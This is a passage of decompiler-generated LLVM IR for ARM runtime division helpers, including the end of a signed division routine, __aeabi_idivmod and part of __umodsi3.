  br i1 %v3_1270c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1270c
  %v4_12710 = mul i32 %v1_127b4, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1270c, %.thread
  %v0_12730.pr40.ph = phi i32 [ %v4_12710, %.thread ], [ %v1_127b4, %dec_label_pc_1270c ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1270c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_12730.pr40 = phi i32 [ %v4_12724, %bb89 ], [ %v0_12730.pr40.ph, %.preheader.preheader ]
  %v1_12728 = phi i32 [ %v4_12728, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_1271c = icmp ugt i32 %v0_12730.pr40, 268435455
  br i1 %v2_1271c, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_12730thread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_12720 = icmp ult i32 %v0_12730.pr40, %v0_127e8
  br i1 %v4_12720, label %bb88, label %dec_label_pc_12730thread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_12724 = and i32 %v0_12730.pr40, 268435456
  %v3_12724 = icmp eq i32 %v2_12724, 0
  %v4_12724 = mul i32 %v0_12730.pr40, 16
  br i1 %v3_12724, label %bb89, label %dec_label_pc_12730.loopexit

bb89:                                             ; preds = %bb88
  %v2_12728 = and i32 %v1_12728, 268435456
  %v3_12728 = icmp eq i32 %v2_12728, 0
  %v4_12728 = mul i32 %v1_12728, 16
  br i1 %v3_12728, label %.preheader, label %dec_label_pc_12730thread-pre-split.loopexit.loopexit

dec_label_pc_12730thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1273c52.ph = phi i32 [ %v1_12728, %bb87 ], [ %v4_12728, %bb89 ]
  %v0_12730.pr42.ph = phi i32 [ %v0_12730.pr40, %bb87 ], [ %v4_12724, %bb89 ]
  br label %dec_label_pc_12730thread-pre-split.loopexit

dec_label_pc_12730thread-pre-split.loopexit:      ; preds = %dec_label_pc_12730thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1273c52 = phi i32 [ %v1_12728, %.thread3 ], [ %v1_1273c52.ph, %dec_label_pc_12730thread-pre-split.loopexit.loopexit ]
  %v0_12730.pr42 = phi i32 [ %v0_12730.pr40, %.thread3 ], [ %v0_12730.pr42.ph, %dec_label_pc_12730thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12730thread-pre-split

dec_label_pc_12730thread-pre-split:               ; preds = %dec_label_pc_12730thread-pre-split.loopexit, %bb91
  %v1_1273c50 = phi i32 [ %v1_1273c52, %dec_label_pc_12730thread-pre-split.loopexit ], [ %v3_1273c, %bb91 ]
  %v2_1273448 = phi i32 [ %v0_127e8, %dec_label_pc_12730thread-pre-split.loopexit ], [ %v2_12734, %bb91 ]
  %v0_12730.pr = phi i32 [ %v0_12730.pr42, %dec_label_pc_12730thread-pre-split.loopexit ], [ %v3_12738, %bb91 ]
  br label %dec_label_pc_12730

dec_label_pc_12730.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %dec_label_pc_12730.loopexit, %dec_label_pc_12730thread-pre-split
  %v1_1273c = phi i32 [ %v1_1273c50, %dec_label_pc_12730thread-pre-split ], [ %v1_12728, %dec_label_pc_12730.loopexit ]
  %v2_12734 = phi i32 [ %v2_1273448, %dec_label_pc_12730thread-pre-split ], [ %v0_127e8, %dec_label_pc_12730.loopexit ]
  %v1_12738 = phi i32 [ %v0_12730.pr, %dec_label_pc_12730thread-pre-split ], [ %v4_12724, %dec_label_pc_12730.loopexit ]
  %v2_12730 = icmp slt i32 %v1_12738, 0
  br i1 %v2_12730, label %dec_label_pc_12744, label %bb90

bb90:                                             ; preds = %dec_label_pc_12730
  %v4_12734 = icmp ult i32 %v1_12738, %v2_12734
  br i1 %v4_12734, label %bb91, label %dec_label_pc_12744

bb91:                                             ; preds = %bb90
  %v3_12738 = mul i32 %v1_12738, 2
  %v2_1273c = icmp slt i32 %v1_1273c, 0
  %v3_1273c = mul i32 %v1_1273c, 2
  br i1 %v2_1273c, label %dec_label_pc_12744, label %dec_label_pc_12730thread-pre-split

dec_label_pc_12744:                               ; preds = %bb90, %dec_label_pc_12730, %bb91
  %v2_1275063 = phi i32 [ %v3_1273c, %bb91 ], [ %v1_1273c, %bb90 ], [ %v1_1273c, %dec_label_pc_12730 ]
  %v1_1274855 = phi i32 [ %v3_12738, %bb91 ], [ %v1_12738, %bb90 ], [ %v1_12738, %dec_label_pc_12730 ]
  br label %dec_label_pc_12748

dec_label_pc_12748:                               ; preds = %.thread13, %dec_label_pc_12744
  %v1_1277c = phi i32 [ %v4_1277c, %.thread13 ], [ %v2_1275063, %dec_label_pc_12744 ]
  %v1_12750 = phi i32 [ %v1_1278c, %.thread13 ], [ 0, %dec_label_pc_12744 ]
  %v1_12780 = phi i32 [ %v4_12780, %.thread13 ], [ %v1_1274855, %dec_label_pc_12744 ]
  %v1_1274c = phi i32 [ %v0_12778, %.thread13 ], [ %v0_127e8, %dec_label_pc_12744 ]
  %v3_12748 = icmp ult i32 %v1_1274c, %v1_12780
  br i1 %v3_12748, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_12748
  %v3_1274c = sub i32 %v1_1274c, %v1_12780
  %v3_12750 = or i32 %v1_12750, %v1_1277c
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12748, %bb92
  %v1_12758 = phi i32 [ %v1_1274c, %dec_label_pc_12748 ], [ %v3_1274c, %bb92 ]
  %v1_1275c = phi i32 [ %v1_12750, %dec_label_pc_12748 ], [ %v3_12750, %bb92 ]
  %v4_12754 = udiv i32 %v1_12780, 2
  %v6_12754 = icmp ult i32 %v1_12758, %v4_12754
  br i1 %v6_12754, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_12758 = urem i32 %v1_12780, 2
  %v4_12758 = icmp eq i32 %v3_12758, 0
  %v6_12758 = sub i32 %v1_12758, %v4_12754
  br i1 %v4_12758, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1275c = udiv i32 %v1_1277c, 2
  %v6_1275c = or i32 %v1_1275c, %v5_1275c
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_12764 = phi i32 [ %v6_12758, %bb93 ], [ %v1_12758, %.thread8 ], [ %v6_12758, %bb94 ]
  %v1_12768 = phi i32 [ %v1_1275c, %bb93 ], [ %v1_1275c, %.thread8 ], [ %v6_1275c, %bb94 ]
  %v4_12760 = udiv i32 %v1_12780, 4
  %v6_12760 = icmp ult i32 %v1_12764, %v4_12760
  br i1 %v6_12760, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_12764 = and i32 %v1_12780, 2
  %v4_12764 = icmp eq i32 %v3_12764, 0
  %v6_12764 = sub i32 %v1_12764, %v4_12760
  br i1 %v4_12764, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_12768 = udiv i32 %v1_1277c, 4
  %v6_12768 = or i32 %v1_12768, %v5_12768
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_12770 = phi i32 [ %v6_12764, %bb95 ], [ %v1_12764, %.thread9 ], [ %v6_12764, %bb96 ]
  %v1_12774 = phi i32 [ %v1_12768, %bb95 ], [ %v1_12768, %.thread9 ], [ %v6_12768, %bb96 ]
  %v4_1276c = udiv i32 %v1_12780, 8
  %v6_1276c = icmp ult i32 %v1_12770, %v4_1276c
  br i1 %v6_1276c, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_12770 = and i32 %v1_12780, 4
  %v4_12770 = icmp eq i32 %v3_12770, 0
  %v6_12770 = sub i32 %v1_12770, %v4_1276c
  br i1 %v4_12770, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12774 = udiv i32 %v1_1277c, 8
  %v6_12774 = or i32 %v1_12774, %v5_12774
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1278c = phi i32 [ %v1_12774, %bb97 ], [ %v1_12774, %.thread10 ], [ %v6_12774, %bb98 ]
  %v0_12778 = phi i32 [ %v6_12770, %bb97 ], [ %v1_12770, %.thread10 ], [ %v6_12770, %bb98 ]
  %v2_12778 = icmp eq i32 %v0_12778, 0
  br i1 %v2_12778, label %dec_label_pc_12788, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1277c, 16
  br i1 %tmp, label %dec_label_pc_12788, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1277c = udiv i32 %v1_1277c, 16
  %v4_12780 = udiv i32 %v1_12780, 16
  br label %dec_label_pc_12748

dec_label_pc_12788:                               ; preds = %thread-pre-split12, %bb99
  %v1_12788 = icmp slt i32 %v2_126e0, 0
  br i1 %v1_12788, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12788
  %v2_1278c = sub i32 0, %v1_1278c
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12794, %dec_label_pc_12788, %bb100
  %v1_12790 = phi i32 [ %v1_1278c, %dec_label_pc_12788 ], [ %v2_1278c, %bb100 ], [ %v0_126e0, %dec_label_pc_12794 ], [ %v2_12798, %bb101 ], [ %v1_127ac80, %bb103 ], [ %v2_127a8, %bb104 ]
  ret i32 %v1_12790

dec_label_pc_12794:                               ; preds = %thread-pre-split
  br i1 %v1_126dc, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12794
  %v2_12798 = sub i32 0, %v0_126e0
  br label %.thread16

dec_label_pc_127a0:                               ; preds = %bb86
  br i1 %v3_126fc, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_127a0
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_127a0, %bb102
  %v1_127ac80 = phi i32 [ %v0_126e0, %dec_label_pc_127a0 ], [ 0, %bb102 ]
  br i1 %v9_126fc, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_127a4 = ashr i32 %v2_126e0, 31
  %v2_127a8 = or i32 %v4_127a4, 1
  br label %.thread16

dec_label_pc_127b0:                               ; preds = %dec_label_pc_12704
  %v2_127b0 = icmp ugt i32 %v1_127b4, 65535
  br i1 %v2_127b0, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_127b0
  %v2_127b4 = and i32 %v1_127b4, 32768
  %v3_127b4 = icmp eq i32 %v2_127b4, 0
  %v4_127b4 = udiv i32 %v1_127b4, 65536
  br i1 %v3_127b4, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_127b0
  %v0_127c070 = phi i32 [ %v1_127b4, %dec_label_pc_127b0 ], [ %v4_127b4, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_127c4 = phi i32 [ %v0_127c070, %.thread19 ], [ %v4_127b4, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_127c0 = icmp ugt i32 %v1_127c4, 255
  br i1 %v2_127c0, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_127c4 = and i32 %v1_127c4, 128
  %v3_127c4 = icmp eq i32 %v2_127c4, 0
  %v4_127c4 = udiv i32 %v1_127c4, 256
  br i1 %v3_127c4, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_127c8 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_127d4 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_127c8, %bb108 ]
  %v1_127d0 = phi i32 [ %v1_127c4, %bb106 ], [ %v4_127c4, %bb107 ], [ %v4_127c4, %bb108 ]
  %v2_127cc = icmp ugt i32 %v1_127d0, 15
  br i1 %v2_127cc, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_127d0 = and i32 %v1_127d0, 8
  %v3_127d0 = icmp eq i32 %v2_127d0, 0
  %v4_127d0 = udiv i32 %v1_127d0, 16
  br i1 %v3_127d0, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_127d4 = add nsw i32 %v1_127d4, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_127dc = phi i32 [ %v1_127d4, %.thread20 ], [ %v1_127d4, %bb109 ], [ %v2_127d4, %bb110 ]
  %v5_127e0 = phi i32 [ %v1_127d0, %.thread20 ], [ %v4_127d0, %bb109 ], [ %v4_127d0, %bb110 ]
  %v2_127d8 = icmp ugt i32 %v5_127e0, 3
  %v7_127d8 = icmp eq i32 %v5_127e0, 4
  %v2_127dc = xor i1 %v7_127d8, true
  %v3_127dc = and i1 %v2_127d8, %v2_127dc
  br i1 %v3_127dc, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_127dc = add nsw i32 %v4_127dc, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_127e0 = phi i32 [ %v4_127dc, %.thread21 ], [ %v5_127dc, %bb111 ]
  %v2_127e0 = xor i1 %v2_127d8, true
  %v3_127e0 = or i1 %v7_127d8, %v2_127e0
  br i1 %v3_127e0, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_127e0 = udiv i32 %v5_127e0, 2
  %v9_127e0 = add i32 %v4_127e0, %v8_127e0
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_127e8 = phi i32 [ %v4_127e0, %bb112 ], [ %v9_127e0, %bb113 ]
  %v1_127e4 = icmp slt i32 %v2_126e0, 0
  %v6_127e8 = lshr i32 %v0_127e8, %v1_127e8
  %v2_127ec = sub i32 0, %v6_127e8
  %v2_127ec.v6_127e8 = select i1 %v1_127e4, i32 %v2_127ec, i32 %v6_127e8
  ret i32 %v2_127ec.v6_127e8

dec_label_pc_127f4:                               ; preds = %entry
  %v0_127f4 = load i32, i32* @lr, align 4
  %v0_127f8 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_127f4)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_127e0, { 1, 0 }
  uselistorder i1 %v7_127d8, { 1, 0 }
  uselistorder i32 %v4_127d0, { 1, 0 }
  uselistorder i32 %v1_127d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_127c4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_127c4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_127b4, { 1, 0 }
  uselistorder i32 %v0_12778, { 1, 0 }
  uselistorder i32 %v4_1276c, { 1, 0 }
  uselistorder i32 %v1_12774, { 1, 2, 0 }
  uselistorder i32 %v4_12760, { 1, 0 }
  uselistorder i32 %v1_12768, { 1, 2, 0 }
  uselistorder i32 %v4_12754, { 1, 0 }
  uselistorder i32 %v1_1275c, { 1, 2, 0 }
  uselistorder i32 %v1_12780, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12750, { 1, 0 }
  uselistorder i32 %v1_1277c, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1273c, { 1, 0 }
  uselistorder i32 %v3_12738, { 1, 0 }
  uselistorder i32 %v1_12738, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12734, { 1, 0 }
  uselistorder i32 %v1_1273c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12728, { 1, 0 }
  uselistorder i32 %v4_12724, { 2, 1, 0 }
  uselistorder i32 %v1_12728, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12730.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_126fc, { 1, 0 }
  uselistorder i32 %v1_127b4, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_126e0, { 1, 0, 2 }
  uselistorder i32 %v0_126e0, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 15, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 113, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 0, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 115, 66, 116, 67, 117, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 109, 1, 82, 81, 80, 85, 84, 83, 86, 87, 88, 89, 114, 90, 91, 92, 108, 97, 93, 94, 98, 95, 96, 99, 104, 100, 101, 103, 102, 105, 107, 106, 110, 111, 112 }
  uselistorder i32 128, { 11, 12, 6, 7, 9, 5, 14, 0, 19, 20, 1, 8, 15, 16, 2, 3, 10, 17, 18, 4, 13 }
  uselistorder i32 255, { 2, 3, 5, 1, 4, 0 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 15, 11, 16, 12, 17, 13, 18, 14, 19, 20, 21, 25, 22, 26, 23, 27, 24, 28, 30, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 32768, { 2, 3, 1, 0, 4 }
  uselistorder i32 65535, { 1, 2, 0 }
  uselistorder i32 31, { 10, 1, 9, 4, 11, 3, 2, 0, 5, 7, 6, 8, 12, 13 }
  uselistorder i1 true, { 0, 1, 2, 3, 4, 44, 47, 5, 6, 8, 7, 9, 50, 48, 10, 11, 12, 13, 14, 15, 49, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 31, 28, 29, 32, 33, 43, 51, 34, 35, 36, 45, 37, 38, 39, 40, 46, 41, 42 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12788, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12744, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12730thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12808 = sdiv i32 %arg1, %arg2
  ret i32 %v2_12808
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1281c = add i32 %arg2, -1
  %v2_1281c = icmp eq i32 %arg2, 0
  br i1 %v2_1281c, label %dec_label_pc_128d8, label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %entry
  %v7_1281c = icmp eq i32 %arg2, 1
  br i1 %v7_1281c, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_12824
  %v1_12824 = load i32, i32* @r0, align 4
  %v10_12824 = icmp eq i32 %v1_12824, %arg2
  br i1 %v10_12824, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_12824, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_12824 = icmp ult i32 %v1_12824, %arg2
  br i1 %v4_12824, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_1282c = and i32 %v1_1281c, %arg2
  %v8_1282c = icmp eq i32 %v6_1282c, 0
  br i1 %v8_1282c, label %.thread67, label %dec_label_pc_1283c.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_12830 = phi i32 [ %v1_12824, %bb75 ], [ 0, %.thread65 ]
  %v3_12830 = and i32 %v1_12830, %v1_1281c
  br label %bb76

dec_label_pc_1283c.preheader:                     ; preds = %bb75
  %v2_1283c99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1283c99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_128cc, %bb74, %bb89, %bb84, %dec_label_pc_1289c, %.thread67
  %v5_12834 = phi i32 [ %v1_12824, %bb74 ], [ %v3_12830, %.thread67 ], [ %v1_12878.v6_12878.v6_12880.v6_12888, %dec_label_pc_1289c ], [ 0, %bb84 ], [ %v1_128d0, %dec_label_pc_128cc ], [ %v2_128cc, %bb89 ]
  ret i32 %v5_12834

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_1283c.preheader
  %v0_12850.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_1283c.preheader ], [ %v4_12844, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_1283c.preheader ], [ %v2_1284811, %.thread1.thread9 ]
  br label %dec_label_pc_12850thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_1283c.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1284811, %.thread1.thread9 ], [ 0, %dec_label_pc_1283c.preheader ]
  %v0_12850.pr33100 = phi i32 [ %v4_12844, %.thread1.thread9 ], [ %arg2, %dec_label_pc_1283c.preheader ]
  %v4_12840 = icmp ult i32 %v0_12850.pr33100, %v1_12824
  br i1 %v4_12840, label %bb78, label %dec_label_pc_12850thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_12844 = and i32 %v0_12850.pr33100, 268435456
  %v3_12844 = icmp eq i32 %v2_12844, 0
  %v4_12844 = mul i32 %v0_12850.pr33100, 16
  br i1 %v3_12844, label %.thread1.thread9, label %dec_label_pc_12850.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1284811 = add i32 %storemerge101, 4
  %v2_1283c = icmp ugt i32 %v4_12844, 268435455
  br i1 %v2_1283c, label %.thread, label %bb77

dec_label_pc_12850thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_12850thread-pre-split.loopexit

dec_label_pc_12850thread-pre-split.loopexit:      ; preds = %dec_label_pc_12850thread-pre-split.loopexit.loopexit, %.thread
  %v0_12850.pr3398 = phi i32 [ %v0_12850.pr33.lcssa, %.thread ], [ %v0_12850.pr33100, %dec_label_pc_12850thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_12850thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_12850thread-pre-split

dec_label_pc_12850thread-pre-split:               ; preds = %.thread4, %dec_label_pc_12850thread-pre-split.loopexit
  %v1_1285c39 = phi i32 [ %storemerge95, %dec_label_pc_12850thread-pre-split.loopexit ], [ %v2_1285c, %.thread4 ]
  %v0_12850.pr = phi i32 [ %v0_12850.pr3398, %dec_label_pc_12850thread-pre-split.loopexit ], [ %v3_12858, %.thread4 ]
  br label %dec_label_pc_12850

dec_label_pc_12850.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_12850

dec_label_pc_12850:                               ; preds = %dec_label_pc_12850.loopexit, %dec_label_pc_12850thread-pre-split
  %v0_12864.pr = phi i32 [ %v1_1285c39, %dec_label_pc_12850thread-pre-split ], [ %storemerge101, %dec_label_pc_12850.loopexit ]
  %v1_12858 = phi i32 [ %v0_12850.pr, %dec_label_pc_12850thread-pre-split ], [ %v4_12844, %dec_label_pc_12850.loopexit ]
  %v2_12850 = icmp slt i32 %v1_12858, 0
  br i1 %v2_12850, label %dec_label_pc_12864, label %bb79

bb79:                                             ; preds = %dec_label_pc_12850
  %v4_12854 = icmp ult i32 %v1_12858, %v1_12824
  br i1 %v4_12854, label %.thread4, label %dec_label_pc_12864

.thread4:                                         ; preds = %bb79
  %v3_12858 = mul i32 %v1_12858, 2
  %v2_1285c = add i32 %v0_12864.pr, 1
  br label %dec_label_pc_12850thread-pre-split

dec_label_pc_12864:                               ; preds = %bb79, %dec_label_pc_12850
  %v2_12864 = add i32 %v0_12864.pr, -3
  %v5_12868 = icmp slt i32 %v0_12864.pr, 3
  br i1 %v5_12868, label %dec_label_pc_128a8, label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %dec_label_pc_12864, %bb83
  %v6_12894 = phi i32 [ %v0_1289c, %bb83 ], [ %v2_12864, %dec_label_pc_12864 ]
  %v1_12870 = phi i32 [ %v1_12878.v6_12878.v6_12880.v6_12888, %bb83 ], [ %v1_12824, %dec_label_pc_12864 ]
  %v3_1289012 = phi i32 [ %v3_12890, %bb83 ], [ %v1_12858, %dec_label_pc_12864 ]
  %v3_1286c = icmp ult i32 %v1_12870, %v3_1289012
  %v3_12870 = select i1 %v3_1286c, i32 0, i32 %v3_1289012
  %v1_12878 = sub i32 %v1_12870, %v3_12870
  %v4_12874 = udiv i32 %v3_1289012, 2
  %v6_12874 = icmp ult i32 %v1_12878, %v4_12874
  %v6_12878 = select i1 %v6_12874, i32 0, i32 %v4_12874
  %v1_12878.v6_12878 = sub i32 %v1_12878, %v6_12878
  %.demorgan = and i1 %v3_1286c, %v6_12874
  %v4_1287c = udiv i32 %v3_1289012, 4
  %v6_1287c = icmp ult i32 %v1_12878.v6_12878, %v4_1287c
  %v6_12880 = select i1 %v6_1287c, i32 0, i32 %v4_1287c
  %v1_12878.v6_12878.v6_12880 = sub i32 %v1_12878.v6_12878, %v6_12880
  %.demorgan71 = and i1 %.demorgan, %v6_1287c
  %v4_12884 = udiv i32 %v3_1289012, 8
  %v6_12884 = icmp ult i32 %v1_12878.v6_12878.v6_12880, %v4_12884
  %v6_12888 = select i1 %v6_12884, i32 0, i32 %v4_12884
  %v1_12878.v6_12878.v6_12880.v6_12888 = sub i32 %v1_12878.v6_12878.v6_12880, %v6_12888
  %.demorgan72 = and i1 %.demorgan71, %v6_12884
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_1286c
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_1286c, %bb80
  %v2_1288c = add i32 %v1_12878.v6_12878.v6_12880.v6_12888, -1
  %v4_1288c = sub i32 0, %v1_12878.v6_12878.v6_12880.v6_12888
  %v5_1288c = and i32 %v1_12878.v6_12878.v6_12880.v6_12888, %v4_1288c
  %v3_12890 = udiv i32 %v3_1289012, 16
  %v5_12894 = icmp slt i32 %v1_12878.v6_12878.v6_12880.v6_12888, 1
  br i1 %v5_12894, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_12894 = add i32 %v6_12894, -4
  %v9_12894 = sub i32 3, %v6_12894
  %v10_12894 = and i32 %v9_12894, %v6_12894
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_1289c = phi i32 [ %v6_12894, %bb81 ], [ %v7_12894, %bb82 ]
  %v0_1289815.in = phi i32 [ %v2_1288c, %bb81 ], [ %v7_12894, %bb82 ]
  %v1_1289814.in = phi i32 [ %v5_1288c, %bb81 ], [ %v10_12894, %bb82 ]
  %v1_1289814 = icmp slt i32 %v1_1289814.in, 0
  %v0_1289815 = icmp slt i32 %v0_1289815.in, 0
  %v2_12898 = xor i1 %v0_1289815, %v1_1289814
  br i1 %v2_12898, label %dec_label_pc_1289c, label %dec_label_pc_1286c

dec_label_pc_1289c:                               ; preds = %bb83
  %v1_1289c = urem i32 %v0_1289c, 4
  %v2_1289c = icmp eq i32 %v1_1289c, 0
  br i1 %v2_1289c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_1289c
  %v3_128a0 = icmp eq i32 %v1_12878.v6_12878.v6_12880.v6_12888, 0
  br i1 %v3_128a0, label %bb76, label %dec_label_pc_128a8

dec_label_pc_128a8:                               ; preds = %bb84, %dec_label_pc_12864
  %v0_128bc = phi i32 [ %v3_12890, %bb84 ], [ %v1_12858, %dec_label_pc_12864 ]
  %v1_128b8 = phi i32 [ %v1_12878.v6_12878.v6_12880.v6_12888, %bb84 ], [ %v1_12824, %dec_label_pc_12864 ]
  %v0_128a8 = phi i32 [ %v0_1289c, %bb84 ], [ %v2_12864, %dec_label_pc_12864 ]
  %v5_128ac = icmp slt i32 %v0_128a8, -2
  br i1 %v5_128ac, label %dec_label_pc_128cc, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %dec_label_pc_128a8
  %v8_128a8 = icmp eq i32 %v0_128a8, -2
  br i1 %v8_128a8, label %dec_label_pc_128c0, label %dec_label_pc_128b4

dec_label_pc_128b4:                               ; preds = %dec_label_pc_128b0
  %v3_128b4 = icmp ult i32 %v1_128b8, %v0_128bc
  br i1 %v3_128b4, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_128b4
  %v2_128b4 = sub i32 %v1_128b8, %v0_128bc
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_128b4, %bb85
  %v0_128c052 = phi i32 [ %v1_128b8, %dec_label_pc_128b4 ], [ %v2_128b4, %bb85 ]
  %v3_128bc = udiv i32 %v0_128bc, 2
  br label %dec_label_pc_128c0

dec_label_pc_128c0:                               ; preds = %dec_label_pc_128b0, %bb86
  %v0_128c8 = phi i32 [ %v0_128bc, %dec_label_pc_128b0 ], [ %v3_128bc, %bb86 ]
  %v1_128c4 = phi i32 [ %v1_128b8, %dec_label_pc_128b0 ], [ %v0_128c052, %bb86 ]
